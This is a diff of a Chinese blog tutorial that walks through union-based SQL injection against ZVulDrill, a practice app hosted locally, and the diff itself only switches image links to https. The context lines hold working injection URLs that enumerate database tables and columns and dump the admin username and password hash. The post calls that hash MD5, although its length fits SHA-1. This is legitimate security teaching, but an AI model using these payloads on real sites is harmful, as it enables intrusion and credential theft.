@@ -31,7 +31,7 @@ select * from table_name where column_name='hello''
 在 GitHub 有个 Web 漏洞演练项目 [ZVulDrill](https://github.com/710leo/ZVulDrill)，可以下载后部署在自己的电脑上（这里我就不教大家部署了，熟悉Web编程的大部分都会）
 
 网页内容如下
-![](http://img.blog.csdn.net/20140715201016711)
+![](https://img.blog.csdn.net/20140715201016711)
 
 # II、检测字段长度
 ```
@@ -61,7 +61,7 @@ sql语句
 select * from table_name where column_name like '%hello%' and 1=2 union select 1,2,3,4
 ```
 union前的sql语句中 where条件恒为假，结果集为空，整个sql语句返回的是union后面的结果集
-![](http://img.blog.csdn.net/20140715201042343)
+![](https://img.blog.csdn.net/20140715201042343)
 
 ## ② 获取MySQL version user database 等相关信息
 如上图所示，页面上显示 1,2 ，可以利用这个来显示我们需要的信息
@@ -70,7 +70,7 @@ http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union select
 ```
 即  将 2，3 换成 version(),user()
 页面如下
-![](http://img.blog.csdn.net/20140715201431834)
+![](https://img.blog.csdn.net/20140715201431834)
 
 同理将 user() 换成 database()  得到数据库名  zvuldrill
 
@@ -83,18 +83,18 @@ http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union select
 ```
 http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union select 1,2,GROUP_CONCAT(DISTINCT table_name),4 from information_schema.columns where table_schema='zvuldrill'--%20
 ```
-![](http://img.blog.csdn.net/20140715202557175)
+![](https://img.blog.csdn.net/20140715202557175)
 数据库中有3张表，对我们最有用的是admin这张表，以管理员身份进入网站可以看到各种信息
 ## ② 获取字段名
 ```
 http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union select 1,2,GROUP_CONCAT(DISTINCT column_name),4 from information_schema.columns where table_name='admin'--%20
 ```
-![](http://img.blog.csdn.net/20140715202931238)
+![](https://img.blog.csdn.net/20140715202931238)
 ## ③ 获取数据
 ```
 http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union select 1,2,GROUP_CONCAT(DISTINCT admin_id,admin_name,admin_pass),4 from admin--%20
 ```
-![](http://img.blog.csdn.net/20140715203207348)
+![](https://img.blog.csdn.net/20140715203207348)
 - admin_id：1 
 - admin_name：admin
 - admin_pass：d033e22ae348aeb5660fc2140aec35850c4da997(md5解密之后  得到admin)
